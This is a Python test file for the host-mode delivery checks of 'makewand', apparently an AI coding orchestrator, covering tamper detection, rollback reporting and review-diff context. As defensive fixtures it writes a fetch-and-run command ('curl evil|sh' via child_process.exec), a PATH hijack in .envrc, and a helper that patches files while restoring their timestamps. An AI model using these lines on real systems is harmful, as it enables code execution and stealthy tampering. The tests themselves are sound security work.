"""py-delivery-r4: round 4 of the host-mode delivery fixes (see test_fix_delivery_host_block).

Round 4 pins: a changed link count clears a file only when its content corroborates
it - a full digest, or a sampled fingerprint, which every file without a digest now
gets from a budget of its own - so a file patched behind a hard link added elsewhere,
or one whose re-hash the budget refused, is never delivered; report directories
(coverage/, playwright-report/) count only at the root or at a package root, a
tracked path is never test output, and a pre-existing file the run rewrote is kept
only when that is clearly safe; the comment on the gate/delivery contract tells the
truth; git errors naming undecodable files are printable; the transaction's report
title says whether the rollback restored everything; the review diff keeps three
lines of context whatever diff.context says; and git_helper holds the one test-harness
guard every caller delegates to.
"""

try:
    import _isolation  # noqa: F401
except ImportError:
    from tests import _isolation  # noqa: F401

import contextlib
import io
import os
import re
import stat
import time
import unittest
from pathlib import Path
from unittest.mock import patch

import makewand.git_helper as git_helper
import makewand.orchestrator as orch
from makewand.git_helper import HostWorkspaceTransaction
from makewand.review_contract import review_digest

try:
    from test_fix_delivery_host_block import HELPERS, IS_ROOT, HostDeliveryCase, git
except ImportError:
    from tests.test_fix_delivery_host_block import HELPERS, IS_ROOT, HostDeliveryCase, git

SEVEN_LINES = "a\nb\nc\nd\ne\nf\ng\n"


def patch_in_place(path, offset, data):
    """Overwrites bytes inside path and puts its timestamps back, as a careful attacker would."""
    info = os.stat(path)
    with open(path, "r+b") as handle:
        handle.seek(offset)
        handle.write(data)
    os.utime(path, ns=(info.st_atime_ns, info.st_mtime_ns))


def report_title(output):
    match = re.search(r"\[Makewand Transaction\] ([^\n]*?)，请人工检查", output)
    return match.group(1) if match else None


class LinkCountCorroborationTests(HostDeliveryCase):
    """Item ctime-nlink-regression: the link-count rule needs a digest or sample behind it."""

    INIT = ".venv/lib/python3.12/site-packages/fast/__init__.py"
    LIB = ".venv/lib/python3.12/site-packages/fast/_speedups.so"

    def setUp(self):
        super().setUp()
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".venv/\nnode_modules/\n")
        self.outside = self.base / "uv-cache"  # another environment on the same filesystem
        self.outside.mkdir()

    def start_with_total_limit(self, total):
        with patch.dict(os.environ, {"MAKEWAND_FINGERPRINT_TOTAL_LIMIT": str(total)}):
            return self.start()

    def test_patch_behind_a_hard_link_on_a_file_without_digest_or_sample_blocks(self):
        # INIT fills the digest total; LIB is past it and too large for the sample budget too.
        self.write({self.INIT: "X = 1\n", self.LIB: b"\x7fELF" + b"\x00" * 16})
        txn = self.start_with_total_limit(12)
        self.assertIn(self.INIT, txn.fingerprints)
        self.assertNotIn(self.LIB, txn.fingerprints)
        self.assertNotIn(self.LIB, txn.samples)
        (self.root / "app.py").write_text("VALUE = 2\n")
        time.sleep(0.05)
        os.link(self.root / self.LIB, self.outside / "_speedups.so")
        patch_in_place(self.root / self.LIB, 8, b"EVIL")

        self.finalize(txn)

        self.assertBlocked(txn, self.LIB)
        self.assertIn("无法确认", txn.failure_reason)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_added_hard_link_alone_cannot_clear_a_file_without_digest_or_sample(self):
        # The cost of the rule above: without content to compare, this case looks exactly like it.
        self.write({self.INIT: "X = 1\n", self.LIB: b"\x7fELF" + b"\x00" * 16})
        txn = self.start_with_total_limit(12)
        (self.root / "app.py").write_text("VALUE = 2\n")
        time.sleep(0.05)
        os.link(self.root / self.LIB, self.outside / "_speedups.so")

        self.finalize(txn)

        self.assertBlocked(txn, self.LIB)
        self.assertEqual(txn.unconfirmed, {self.LIB})
        self.assertNotIn("无法恢复", txn.failure_reason)

    def test_budget_refused_rehash_behind_an_added_hard_link_is_unconfirmed(self):
        rel = "node_modules/lib/index.js"
        self.write({rel: "module.exports = 'good';\n"})
        txn = self.start()
        self.assertIn(rel, txn.fingerprints)
        (self.root / "app.py").write_text("VALUE = 2\n")
        lib = self.root / rel
        info = os.stat(lib)
        time.sleep(0.05)
        lib.write_text("module.exports = 'EVIL';\n")  # same size
        os.utime(lib, ns=(info.st_atime_ns, info.st_mtime_ns))
        os.link(lib, self.outside / "index.js")

        with patch.object(git_helper._DigestBudget, "expired", return_value="超出摘要时间预算 (simulated)"):
            self.finalize(txn)

        self.assertBlocked(txn, rel)
        self.assertIn("无法确认", txn.failure_reason)
        self.assertIn("核对时超出摘要时间预算", txn.failure_reason)

    def test_file_past_the_total_budget_is_sampled_and_a_patch_behind_a_hard_link_blocks(self):
        self.write({self.INIT: "X = 1\n", self.LIB: b"\x7fELF" + b"\x00" * 6})
        txn = self.start_with_total_limit(12)
        self.assertNotIn(self.LIB, txn.fingerprints)
        self.assertIn(self.LIB, txn.samples)
        (self.root / "app.py").write_text("VALUE = 2\n")
        time.sleep(0.05)
        os.link(self.root / self.LIB, self.outside / "_speedups.so")
        patch_in_place(self.root / self.LIB, 4, b"EVIL")

        self.finalize(txn)

        self.assertBlocked(txn, self.LIB)
        self.assertIn("无法恢复", txn.failure_reason)  # modified, and no backup can restore it

    def test_files_the_digest_time_budget_skips_are_still_sampled(self):
        files = {f"node_modules/pkg{i}/index.js": f"module.exports = {i};\n" for i in range(20)}
        self.write(files)
        with patch.object(git_helper._DigestBudget, "expired", return_value="超出摘要时间预算 (simulated)"):
            txn = self.start()
        self.assertEqual(txn.fingerprints, {})
        self.assertEqual(set(txn.samples), set(files))
        (self.root / "app.py").write_text("VALUE = 2\n")
        time.sleep(0.05)
        for rel in files:
            os.chmod(self.root / rel, stat.S_IMODE(os.stat(self.root / rel).st_mode))  # ctime only

        self.assertDelivered(self.finalize(txn))  # each sample holds the whole file: content decides

    def test_hard_link_added_elsewhere_to_an_unchanged_digested_file_is_delivered(self):
        rel = "node_modules/lib/index.js"
        self.write({rel: "module.exports = 'good';\n"})
        txn = self.start()
        self.assertIn(rel, txn.fingerprints)
        (self.root / "app.py").write_text("VALUE = 2\n")
        time.sleep(0.05)
        os.link(self.root / rel, self.outside / "index.js")

        self.assertDelivered(self.finalize(txn))

    def test_sample_reads_every_byte_of_a_small_file_once(self):
        mib = 1024 * 1024
        self.assertEqual(git_helper.FINGERPRINT_SAMPLE_BYTES, mib)
        for size in (0, 1, 1000, 64 * 1024, 64 * 1024 + 1, mib - 1, mib):
            with self.subTest(size=size):
                self.assertEqual(git_helper._sample_ranges(size), [(0, size)])
        ranges = git_helper._sample_ranges(4 * mib)
        self.assertEqual(len(ranges), 16)
        self.assertEqual(ranges[0][0], 0)
        self.assertEqual(sum(length for _, length in ranges), mib)
        self.assertEqual(ranges[-1][0] + ranges[-1][1], 4 * mib)
        self.assertTrue(all(a + n <= b for (a, n), (b, _) in zip(ranges, ranges[1:])))


class ReportDirectoryLocationTests(HostDeliveryCase):
    """Item test-output-depth: report directories only where tools write them."""

    def test_report_directories_count_only_at_the_root_or_at_a_package_root(self):
        self.commit({"app.py": "VALUE = 1\n", "packages/api/pyproject.toml": "[project]\n",
                     "packages/cli/setup.py": "", "node_modules/lib/package.json": "{}\n"})
        root = str(self.root)
        for rel in ("coverage/lcov.info", "coverage/lcov-report/prettify.js", "playwright-report/index.html",
                    "packages/api/coverage/index.html", "packages/cli/playwright-report/index.html"):
            with self.subTest(rel=rel):
                self.assertTrue(git_helper.is_test_output_path(rel, root))
        for rel in ("src/coverage/reporter.js", "scripts/coverage/upload.sh", "lib/coverage/index.ts",
                    "tools/playwright-report/gen.js", "packages/web/coverage/index.html",
                    "node_modules/lib/coverage/index.js"):
            with self.subTest(rel=rel):
                self.assertFalse(git_helper.is_test_output_path(rel, root))
        self.write({"packages/web/package.json": "{}\n"})
        self.assertTrue(git_helper.is_test_output_path("packages/web/coverage/index.html", root))
        # Without a root to look for manifests in, only the top of the path counts.
        self.assertTrue(git_helper.is_test_output_path("coverage/lcov.info"))
        self.assertFalse(git_helper.is_test_output_path("packages/web/coverage/index.html"))
        self.assertFalse(git_helper.is_test_output_path("src/coverage/reporter.js"))

    def test_preexisting_ignored_script_under_a_nested_coverage_directory_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="src/coverage/\n")
        self.write({"src/coverage/plugin.js": "module.exports = () => 1;\n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "src/coverage/plugin.js").write_text("require('child_process').exec('curl evil|sh');\n")

        txn = self.deliver(task)

        self.assertBlocked(txn, "src/coverage/plugin.js")
        self.assertEqual((self.root / "src/coverage/plugin.js").read_text(), "module.exports = () => 1;\n")

    def test_preexisting_script_in_a_root_report_directory_rewritten_by_the_task_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="coverage/\n")
        self.write({"coverage/plugin.js": "module.exports = () => 1;\n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "coverage/plugin.js").write_text("require('child_process').exec('curl evil|sh');\n")

        txn = self.deliver(task)

        self.assertBlocked(txn, "coverage/plugin.js")
        self.assertEqual((self.root / "coverage/plugin.js").read_text(), "module.exports = () => 1;\n")

    def test_regenerated_report_assets_and_rewritten_report_data_are_kept(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="coverage/\nhtmlcov/\n.pytest_cache/\n")
        assets = {"coverage/lcov-report/prettify.js": "/* prettify */\n", "htmlcov/coverage_html_cb_1a2b.js": "/* cb */\n",
                  "htmlcov/.gitignore": "# Created by coverage.py\n*\n"}
        data = {"coverage/lcov.info": ("TN:\n", "TN:\nSF:app.py\n"),
                "coverage/lcov-report/index.html": ("<html>1</html>", "<html>2</html>"),
                ".pytest_cache/v/cache/nodeids": ("[]", '["test_app.py::test_value"]')}
        self.write(dict(assets, **{rel: old for rel, (old, _) in data.items()}))

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            time.sleep(0.05)
            self.write(assets)  # a test run copies the static assets again: same bytes, new mtime
            self.write({rel: new for rel, (_, new) in data.items()})

        txn = self.deliver(task)

        self.assertDelivered(txn)
        for rel, (_, new) in data.items():
            self.assertEqual((self.root / rel).read_text(), new)
        for rel, body in assets.items():
            self.assertEqual((self.root / rel).read_text(), body)

    def test_report_the_run_creates_at_a_package_root_is_cleaned_up(self):
        self.commit({"app.py": "VALUE = 1\n", "packages/web/package.json": "{}\n"}, gitignore="coverage/\n")
        report = {"packages/web/coverage/lcov-report/index.html": "<html/>",
                  "packages/web/coverage/lcov-report/prettify.js": "/* prettify */\n",
                  "packages/web/coverage/lcov.info": "TN:\n"}

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write(report)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertFalse(os.path.lexists(self.root / "packages/web/coverage"))

    def test_new_file_under_a_coverage_directory_that_is_no_report_location_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="coverage/\n")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"src/coverage/loader.js": "require('./payload');\n"})

        txn = self.deliver(task)

        self.assertBlocked(txn, "src/coverage/loader.js")
        self.assertFalse(os.path.lexists(self.root / "src/coverage/loader.js"))

    def test_preexisting_test_output_inside_a_nested_repository_is_never_kept(self):
        self.commit({"app.py": "VALUE = 1\n"})
        nested = self.root / "tools/lib"
        self.write({"tools/lib/x.py": "X = 1\n", "tools/lib/junit.xml": "<testsuite tests='1'/>"})
        for arguments in (["init", "-q"], ["config", "user.name", "Fix Delivery"],
                          ["config", "user.email", "fix-delivery@example.invalid"], ["add", "-A"],
                          ["commit", "-q", "-m", "nested"]):
            git(nested, *arguments)  # the nested repository tracks its junit.xml

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "tools/lib/junit.xml").write_text("<testsuite tests='2'/>")

        txn = self.deliver(task)

        self.assertBlocked(txn, "tools/lib/junit.xml")
        self.assertIn("子模块或嵌套 Git 仓库", txn.failure_reason)

    def test_gate_flags_tracked_code_under_a_nested_coverage_directory(self):
        self.commit({"app.py": "VALUE = 1\n", "src/coverage/reporter.js": "module.exports = 1;\n"})

        flagged = orch._filter_non_deliverable_test_changes(["src/coverage/reporter.js"], str(self.root))

        self.assertEqual(flagged, ["src/coverage/reporter.js"])

    def test_untracked_test_output_leaves_out_what_git_tracks(self):
        source = self.base / "sub_source"
        source.mkdir()
        for arguments in (["init", "-q"], ["config", "user.name", "Fix Delivery"],
                          ["config", "user.email", "fix-delivery@example.invalid"]):
            git(source, *arguments)
        (source / "package.json").write_text("{}\n")
        (source / "coverage").mkdir()
        (source / "coverage/summary.json").write_text("{}\n")
        git(source, "add", "-A")
        git(source, "commit", "-q", "-m", "submodule baseline")
        self.commit({"app.py": "VALUE = 1\n", "coverage/reporter.js": "module.exports = 1;\n",
                     "coverage/badge.json": "{}\n", "web/package.json": "{}\n", "web/coverage/tracked.json": "{}\n"})
        git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(source), "sub")
        git(self.root, "commit", "-q", "-m", "add submodule")
        changed = ["coverage/reporter.js", "coverage/badge.json", "coverage/lcov.info", "web/coverage/tracked.json",
                   "web/coverage/lcov.info", "sub/coverage/summary.json", "sub/coverage/lcov.info",
                   "src/coverage/x.js", "app.py"]

        self.assertEqual(git_helper.untracked_test_output(changed, str(self.root)),
                         {"coverage/lcov.info", "web/coverage/lcov.info", "sub/coverage/lcov.info"})
        # Paths relative to a subdirectory, as a test run started there lists them.
        self.assertEqual(git_helper.untracked_test_output(["coverage/tracked.json", "coverage/lcov.info", "package.json"],
                                                          str(self.root / "web")),
                         {"coverage/lcov.info"})
        plain = self.base / "plain"
        plain.mkdir()
        self.assertEqual(git_helper.untracked_test_output(["coverage/a.js", "src/coverage/b.js"], str(plain)),
                         {"coverage/a.js"})


class GateDeliveryContractTests(HostDeliveryCase):
    """Item test-output-comment: what the comment on the test-output definition promises."""

    def test_report_at_a_custom_path_passes_the_gate_and_blocks_the_delivery(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="results/\njunit.xml\n")
        for rel in ("results/pytest-junit.xml", "junit.xml"):
            with self.subTest(rel=rel):
                self.assertEqual(orch._filter_non_deliverable_test_changes([rel], str(self.root)), [])

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"results/pytest-junit.xml": "<testsuite tests='1'/>", "junit.xml": "<testsuite tests='1'/>"})

        txn = self.deliver(task)

        self.assertBlocked(txn, "results/pytest-junit.xml")
        blocked = [re.sub(r"\x1b\[[0-9;]*m", "", line) for line in self.output.splitlines()
                   if "新建了被 .gitignore 忽略的文件" in line]
        self.assertEqual(len(blocked), 1, self.output)
        self.assertTrue(blocked[0].endswith(": results/pytest-junit.xml"), blocked[0])  # junit.xml is test output

    def test_comment_describes_that_contract(self):
        source = Path(git_helper.__file__).read_text(encoding="utf-8")
        self.assertFalse("a report the gate accepts never blocks the delivery" in source.replace("\n# ", " "),
                         "the comment above TEST_OUTPUT_NAMES still promises what the delivery check does not keep")
        self.assertTrue("--junitxml=results/pytest-junit.xml" in source,
                        "the comment above TEST_OUTPUT_NAMES does not name the report the gate accepts and delivery blocks")


@unittest.skipUnless(os.name == "posix", "undecodable file names are a POSIX matter")
@unittest.skipIf(IS_ROOT, "root can read chmod 000 files")
class UndecodableDiffErrorTests(HostDeliveryCase):
    """Item nonutf8-diff-errors: git errors naming an undecodable file are returned printable."""

    def make_unreadable(self, root, rel_bytes):
        path = os.fsencode(str(root)) + b"/" + rel_bytes
        with open(path, "wb") as handle:
            handle.write(b"x\n")
        os.chmod(path, 0)
        self.addCleanup(os.chmod, path, 0o600)

    def assertPrintable(self, error, shown):
        self.assertIsNotNone(error)
        error.encode("utf-8")  # strict: no surrogate escapes left
        self.assertIn(shown, error)
        stream = io.TextIOWrapper(io.BytesIO(), encoding="utf-8", errors="strict")
        print(error, file=stream)
        stream.flush()

    def test_diff_errors_naming_an_undecodable_file_are_printable(self):
        self.commit({"app.py": "VALUE = 1\n"})
        self.make_unreadable(self.root, b"lat\xe9.txt")

        diff, error = git_helper.get_git_diff_status(str(self.root))
        self.assertEqual(diff, "")
        self.assertPrintable(error, "lat\\xe9.txt")
        for arguments, binary in (((), False), (("--binary",), True)):
            with self.subTest(binary=binary):
                _, error = git_helper._read_workspace_diff(str(self.root), None, arguments=arguments, binary=binary)
                self.assertPrintable(error, "lat\\xe9.txt")

    def test_submodule_diff_error_naming_an_undecodable_file_is_printable(self):
        source = self.base / "sub_source"
        source.mkdir()
        for arguments in (["init", "-q"], ["config", "user.name", "Fix Delivery"],
                          ["config", "user.email", "fix-delivery@example.invalid"]):
            git(source, *arguments)
        (source / "lib.py").write_text("X = 1\n")
        git(source, "add", "-A")
        git(source, "commit", "-q", "-m", "submodule baseline")
        self.commit({"app.py": "VALUE = 1\n"})
        git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(source), "sub")
        git(self.root, "commit", "-q", "-m", "add submodule")
        self.make_unreadable(self.root / "sub", b"d\xfcrr.txt")

        diff, error = git_helper.get_git_diff_status(str(self.root))

        self.assertEqual(diff, "")
        self.assertPrintable(error, "d\\xfcrr.txt")
        self.assertIn("Submodule sub", error)


class FinishTitleTests(HostDeliveryCase):
    """Item finish-title: the report title follows what the rollback restored."""

    def test_title_says_when_the_rollback_after_a_block_is_incomplete(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="node_modules/\n")
        lib = self.root / "node_modules/leftpad/index.js"
        self.write({"node_modules/leftpad/index.js": "module.exports = 1;            \n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            info = os.stat(lib)
            time.sleep(0.05)
            lib.write_text("require('x');" + " " * 18 + "\n")  # same size, no backup
            os.utime(lib, ns=(info.st_atime_ns, info.st_mtime_ns))

        txn = self.deliver(task)

        self.assertBlocked(txn, "node_modules/leftpad/index.js")
        title = report_title(self.output)
        self.assertIn("交付核验触发安全阻断，回滚未能完全恢复任务前状态", title)
        self.assertNotIn("已回滚", title)
        self.assertNotIn("已执行回滚", title)

    def test_title_says_when_the_rollback_after_a_block_is_complete(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".envrc\n")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({".envrc": "export PATH=/tmp/evil:$PATH\n"})

        txn = self.deliver(task)

        self.assertBlocked(txn, ".envrc")
        self.assertIn("交付核验触发安全阻断，改动已回滚", report_title(self.output))
        self.assertIn("UNVERIFIED", report_title(self.output))

    def test_title_when_the_delivery_check_itself_fails_and_the_rollback_completes(self):
        self.commit({"app.py": "VALUE = 1\n"})
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")

        with patch.object(HostWorkspaceTransaction, "_unreviewed_changes", side_effect=RuntimeError("simulated")):
            self.finalize(txn)

        self.assertFalse(txn.succeeded)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")
        title = report_title(self.output)
        self.assertIn("交付核验未能完成，改动已回滚", title)
        self.assertNotIn("回滚未能完全恢复", title)


class ReviewContextTests(HostDeliveryCase):
    """Item review-context: the review diff keeps three lines of context, consistently."""

    HUNK = "@@ -1,7 +1,7 @@\n a\n b\n c\n-d\n+D\n e\n f\n g"

    def test_review_diff_keeps_three_lines_of_context_under_diff_context_zero(self):
        self.commit({"app.txt": SEVEN_LINES})
        git(self.root, "config", "diff.context", "0")
        (self.root / "app.txt").write_text(SEVEN_LINES.replace("d\n", "D\n"))

        diff, error = git_helper.get_git_diff_status(str(self.root))

        self.assertIsNone(error)
        self.assertIn(self.HUNK, diff)

    def test_submodule_review_diff_keeps_its_context_too(self):
        source = self.base / "sub_source"
        source.mkdir()
        for arguments in (["init", "-q"], ["config", "user.name", "Fix Delivery"],
                          ["config", "user.email", "fix-delivery@example.invalid"]):
            git(source, *arguments)
        (source / "lib.txt").write_text(SEVEN_LINES)
        git(source, "add", "-A")
        git(source, "commit", "-q", "-m", "submodule baseline")
        self.commit({"app.py": "VALUE = 1\n"})
        git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(source), "sub")
        git(self.root, "commit", "-q", "-m", "add submodule")
        for repo in (self.root, self.root / "sub"):
            git(repo, "config", "diff.context", "0")
        (self.root / "sub/lib.txt").write_text(SEVEN_LINES.replace("d\n", "D\n"))

        diff, error = git_helper.get_git_diff_status(str(self.root))

        self.assertIsNone(error)
        self.assertIn("[Submodule: sub]", diff)
        self.assertIn(self.HUNK, diff)

    def test_review_diff_and_the_digest_bound_to_it_stay_consistent(self):
        self.commit({"app.txt": SEVEN_LINES, "README.md": "x\n"})
        git(self.root, "config", "diff.context", "0")
        (self.root / "app.txt").write_text(SEVEN_LINES.replace("d\n", "D\n"))
        self.write({"helpers.py": HELPERS})

        first, error = git_helper.get_git_diff_status(str(self.root))
        self.assertIsNone(error)
        self.assertEqual(git_helper.get_git_diff(str(self.root)), first)
        self.assertEqual(review_digest(git_helper.get_git_diff_status(str(self.root))[0]), review_digest(first))
        # The listing the delivery check parses does not grow a patch from the pinned context.
        raw, error = git_helper._read_workspace_diff(str(self.root), None, arguments=("--raw", "-z", "--no-renames"),
                                                     binary=True)
        self.assertIsNone(error)
        self.assertNotIn(b"@@", raw)

    def test_reviewer_sees_the_context_and_the_reviewed_digest_is_delivered(self):
        self.commit({"app.txt": SEVEN_LINES}, gitignore="__pycache__/\n")
        git(self.root, "config", "diff.context", "0")
        prompts = []

        def dispatch(engine, prompt_text, cwd=None, readonly=False, **kwargs):
            if readonly:
                prompts.append(prompt_text)
                return True, 'MAKEWAND_VERDICT: {"pass": true, "defects": []}', None
            (Path(cwd) / "app.txt").write_text(SEVEN_LINES.replace("d\n", "D\n"))
            return True, "implemented", None

        route = (["codex"], ["claude"], {"primary_coder": "codex", "primary_reviewer": "claude", "reasons": []})
        out = io.StringIO()
        with contextlib.ExitStack() as stack:
            stack.enter_context(patch.object(orch, "check_load_backpressure", return_value=True))
            stack.enter_context(patch.object(orch, "check_working_tree_isolation", return_value=(True, None)))
            stack.enter_context(patch.object(orch, "get_or_update_status", return_value={}))
            stack.enter_context(patch.object(orch, "classify_prompt_intent", return_value="code"))
            stack.enter_context(patch.object(orch, "select_optimal_engine_pair", return_value=route))
            stack.enter_context(patch.object(orch, "dispatch_task", side_effect=dispatch))
            stack.enter_context(patch.object(orch, "run_local_tests", return_value=(True, "1 passed in 0.01s")))
            stack.enter_context(patch("makewand.memory.format_memory_hints_for_prompt", return_value=""))
            stack.enter_context(contextlib.redirect_stdout(out))
            stack.enter_context(contextlib.redirect_stderr(out))
            result = orch.run_pipeline("Capitalise the fourth line of app.txt", cwd=str(self.root), auto_fix=False)
        self.output = out.getvalue()

        self.assertTrue(result, self.output)
        self.assertIn(self.HUNK, "\n".join(prompts))
        self.assertEqual((self.root / "app.txt").read_text(), SEVEN_LINES.replace("d\n", "D\n"))


class SharedHarnessGuardTests(HostDeliveryCase):
    """Item guard-single-source: git_helper.harness_source_tree_conflict is the one guard."""

    def setUp(self):
        super().setUp()
        self.commit({"makewand-src/makewand/__init__.py": "", "other/app.py": "VALUE = 1\n"})
        self.source = (self.root / "makewand-src").resolve()

    def test_guard_covers_the_path_and_the_repository_holding_it(self):
        guard = git_helper.harness_source_tree_conflict
        for target in (self.source, self.source / "makewand", self.root, self.root / "other"):
            with self.subTest(target=str(target)):
                message = guard(str(target), "应用候选", source=self.source)
                self.assertIn("测试环境中拒绝应用候选", message or "")
                self.assertIn(str(self.source), message)
        unrelated = self.base / "unrelated"
        unrelated.mkdir()
        self.assertIsNone(guard(str(unrelated), source=self.source))
        with patch.object(git_helper, "_makewand_source_root", return_value=self.source):
            self.assertIsNotNone(guard(str(self.root / "other")))  # the default source tree
        with patch.dict(os.environ):
            os.environ.pop("MAKEWAND_TEST_ISOLATION_ROOT", None)
            self.assertIsNone(guard(str(self.source), source=self.source))
        self.assertIs(git_helper._test_harness_source_conflict, guard)

    def test_host_transaction_refuses_a_directory_of_the_source_repository(self):
        with patch.object(git_helper, "_makewand_source_root", return_value=self.source):
            txn = HostWorkspaceTransaction(str(self.root / "other"))
            self.assertIn("测试环境中拒绝建立宿主模式事务", txn.capture_pre_snapshot() or "")
            self.assertIsNotNone(txn.begin())


if __name__ == "__main__":
    unittest.main()
